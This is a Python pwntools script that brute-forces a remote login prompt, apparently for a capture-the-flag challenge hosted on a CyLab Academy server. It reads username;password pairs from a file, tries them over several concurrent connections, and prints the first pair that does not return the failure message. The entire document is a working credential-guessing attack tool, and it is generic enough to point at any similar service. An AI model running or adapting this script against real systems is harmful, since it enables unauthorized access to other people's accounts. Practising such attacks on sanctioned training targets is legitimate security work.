from pwn import *
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

HOST = "chatelaine.cylabacademy.net"
PORT = 31754
THREADS = 5        # tune this — see notes below
CREDS_FILE = "creds.txt"

context.log_level = 'error'   # silence pwntools' per-connection logging noise

found = threading.Event()
result = None

def try_login(pair):
    if found.is_set():
        return None  # stop wasting connections once we've got a hit

    username, password = pair
    try:
        io = remote(HOST, PORT, timeout=5)
        io.recvuntil(b"Username:")
        io.sendline(username.encode())
        io.recvuntil(b"Password:")
        io.sendline(password.encode())
        resp = io.recvall(timeout=2)
        io.close()
    except Exception as e:
        return (username, password, f"ERROR: {e}")

    if b"Invalid username or password" not in resp:
        return (username, password, resp)
    return None

def main():
    global result
    with open(CREDS_FILE, "r") as f:
        pairs = []
        for line in f:
            line = line.strip()
            if line and ";" in line:
                u, p = line.split(";", 1)
                pairs.append((u, p))

    print(f"[*] Loaded {len(pairs)} credential pairs, using {THREADS} threads")

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(try_login, pair): pair for pair in pairs}
        for future in as_completed(futures):
            res = future.result()
            if res:
                username, password, resp = res
                if resp and not str(resp).startswith("ERROR"):
                    print(f"[+] SUCCESS: {username}:{password}")
                    print(resp)
                    found.set()
                    result = (username, password, resp)
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                # else: it's an error, just skip silently or log if debugging

    if result:
        print(f"\n[+] FOUND: {result[0]}:{result[1]}")
    else:
        print("\n[-] No valid credentials found in list")

if __name__ == "__main__":
    main()
